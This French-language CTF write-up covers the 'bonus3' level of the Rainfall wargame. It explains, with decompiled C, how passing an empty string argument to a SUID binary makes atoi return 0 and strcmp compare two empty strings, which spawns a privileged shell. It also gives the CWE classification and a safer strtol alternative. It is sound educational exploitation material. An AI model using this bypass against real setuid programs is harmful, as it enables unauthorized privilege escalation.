# Bonus3 - README Pédagogique

## 🎯 Objectif
Exploiter le comportement de `atoi("")` qui retourne `0` pour insérer un **null byte en position 0** du buffer contenant le flag lu depuis un fichier, rendant `strcmp` aveugle et déclenchant `execl("/bin/sh")`.

**Technique** : Logic Flaw — atoi edge case + strcmp null-byte bypass

---

## 🔍 Reconnaissance

### Permissions du fichier
```bash
$ ls -l bonus3
-rwsr-s---+ 1 end users  5595 Mar  6  2016 bonus3
    ^
    └─ Bit SUID actif → s'exécute avec les droits de "end"
```

### Tests comportementaux
```bash
$ ./bonus3
# (pas de sortie — argc < 2)

$ ./bonus3 bla
# (affiche une ligne vide — puts(buffer) après \0)

$ ./bonus3 42
# (affiche buffer[42..] — le reste du flag à partir de l'index 42)

$ ./bonus3 0
# (affiche rien — buffer[0] = \0, puis strcmp("", "0") != 0)
```

---

## 🛠️ Analyse technique

### Code source (décompilé depuis Ghidra)

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv) {
    char buffer[66];
    FILE *fd;
    int index;

    if (argc < 2) return 0;  // Au moins un argument requis

    fd = fopen("/home/user/end/.pass", "r");
    fread(buffer, 1, 66, fd);       // ⚠️ Lit le flag dans buffer (66 bytes)

    index = atoi(argv[1]);          // Convertit argv[1] en entier
    buffer[index] = '\0';           // ⚠️ Insère \0 à l'index dans le buffer

    if (strcmp(buffer, argv[1]) == 0)  // Compare le buffer modifié avec argv[1]
        execl("/bin/sh", "sh", NULL);  // Shell si égaux

    puts(buffer);                   // Sinon affiche le buffer (debug ?)
    fclose(fd);
    return 0;
}
```

---

## 💣 Vulnérabilité : atoi edge case

### 1. Comportement de atoi

`atoi()` (ASCII to Integer) convertit une chaîne en `int`. Comportement sur cas limites :

```c
atoi("42")    → 42
atoi("0")     → 0
atoi("-5")    → -5
atoi("abc")   → 0   // Chaîne non numérique → 0
atoi("")      → 0   // Chaîne VIDE → 0
atoi(NULL)    → undefined behavior
```

**Cas exploitable** : `atoi("")` retourne `0`.

### 2. La chaîne vide comme vecteur

**Avec `argv[1] = ""`** :

```
1. index = atoi("") = 0
2. buffer[0] = '\0'     → buffer devient une chaîne vide
3. strcmp(buffer, argv[1])
   = strcmp("", "")
   = 0  ← ÉGAL ! ✅
4. execl("/bin/sh") ✅
```

**Pourquoi `argv[1] = "0"` ne fonctionne pas** :

```
1. index = atoi("0") = 0
2. buffer[0] = '\0'     → buffer = ""
3. strcmp("", "0") = -48  ← DIFFÉRENT ❌
   (strcmp s'arrête au \0 de buffer, mais "0" n'est pas vide)
```

La clé : `argv[1]` doit être **vide** (`""`) pour que `strcmp` compare deux chaînes vides identiques.

### 3. Pourquoi strcmp arrête-t-il au premier \0 ?

`strcmp` parcourt les deux chaînes byte par byte jusqu'à trouver une différence **ou** un `\0`. Si `buffer[0] = '\0'` et `argv[1][0] = '\0'` (chaîne vide), le premier caractère est `\0` dans les deux cas → égalité immédiate.

```c
strcmp("", "") :
  Comparer '\0' vs '\0'
  → Identiques, et c'est la fin des deux chaînes
  → Retourne 0 ✅
```

### 4. Schéma de l'exploitation

```
AVANT :
buffer = ['3','3','2','1','b','6','f','8',...] (flag en clair)
argv[1] = ""

APRÈS buffer[0] = '\0' :
buffer = ['\0','3','2','1','b','6','f','8',...] → perçu comme ""
argv[1] = "" → perçu comme ""

strcmp("", "") = 0 → execl("/bin/sh") 🎉
```

---

## 🔑 Concepts clés

### 1. atoi() et les chaînes vides

`atoi("")` n'est pas une erreur en C — c'est un comportement défini : retourner `0` si aucun chiffre n'est trouvé. C'est un **edge case** souvent ignoré par les développeurs.

**Alternative sécurisée** : `strtol()` avec vérification d'erreur :
```c
char *end;
errno = 0;
long val = strtol(argv[1], &end, 10);
if (errno != 0 || end == argv[1]) { /* erreur */ }
```

### 2. strcmp et les null bytes

`strcmp` est une comparaison **lexicographique** jusqu'au null terminator. Insérer un `\0` en début de chaîne la rend "vide" pour toute fonction de chaîne C.

```
"flag_content"  →  [f][l][a][g][...]['\0']
After buffer[0]='\0' : ['\0'][l][a][g][...]['\0']
Vu par strcmp : ""  (s'arrête au premier \0)
```

### 3. Différence entre "" et "0"

| argv[1] | atoi() | buffer[index] = \0 | strcmp résultat |
|---|---|---|---|
| `""` | 0 | buffer[0] = \0 | strcmp("", "") = **0** ✅ |
| `"0"` | 0 | buffer[0] = \0 | strcmp("", "0") ≠ 0 ❌ |
| `"5"` | 5 | buffer[5] = \0 | strcmp("flag", "5") ≠ 0 ❌ |

### 4. Logic Flaw vs Memory Corruption

Ce niveau n'implique **aucun dépassement de buffer** — c'est une faille de **logique applicative**. Le programme tente de vérifier que l'utilisateur connaît le flag (`strcmp(buffer, argv[1]) == 0`), mais l'implémentation permet un bypass trivial via une chaîne vide.

Similaire au **Level0** (valeur magique 423) mais plus subtil : ici on exploite un cas limite d'une fonction C standard.

---

## 🚀 Exploitation

### Commande unique

```bash
./bonus3 ""
```

**Explication** : Le shell interprète `""` comme une chaîne vide → `argv[1]` est un pointeur vers `"\0"` → `atoi("")` retourne 0 → le reste suit.

---

## 🔄 Déroulement de l'exploitation

```
1. fopen("/home/user/end/.pass", "r") → fd ouvert ✅
2. fread(buffer, 1, 66, fd)
   → buffer = "3321b6f8..." (flag de 66 bytes)
3. atoi("") → 0
4. buffer[0] = '\0'
   → buffer perçu comme "" par toute fonction de chaîne
5. strcmp("", "") == 0 ✅
6. execl("/bin/sh", "sh", NULL) → Shell "end" 🎉
7. cat /home/user/end/end → "Congratulations graduate!"
```

---

## 📝 Classification

**Type de vulnérabilité** :
- **CWE-840** : Business Logic Errors
- **CWE-20** : Improper Input Validation
- **CWE-697** : Incorrect Comparison (strcmp sur buffer tronqué)
- **CWE-250** : Execution with Unnecessary Privileges (SUID)

**Technique d'exploitation** :
- **atoi edge case** : `""` → `0`
- **null-byte truncation** : `buffer[0] = '\0'` rend le buffer vide
- **strcmp bypass** : deux chaînes vides = égales

---

## 🎓 Résumé

1. **Vulnérabilité** : `atoi("")` retourne 0 → `buffer[0] = '\0'`
2. **Bypass** : buffer devient `""`, argv[1] est `""` → `strcmp` retourne 0
3. **Exploitation** : une seule commande — `./bonus3 ""`
4. **Résultat** : Shell `end` + message final "Congratulations graduate!"

---

## 🔐 Comparaison avec les autres niveaux logic flaw

| | Level0 | Bonus3 |
|---|---|---|
| **Type** | Valeur magique hard-codée | Edge case de fonction stdlib |
| **Condition** | `atoi(argv[1]) == 423` | `strcmp(buffer, argv[1]) == 0` |
| **Exploit** | Passer "423" | Passer "" (chaîne vide) |
| **Connaissance requise** | Décompiler et lire la constante | Connaître atoi("") == 0 |

**Bonus3 conclut le projet Rainfall** — un retour à la logique pure après les exploits mémoire complexes des niveaux précédents. La leçon : les failles les plus simples sont parfois les plus redoutables.
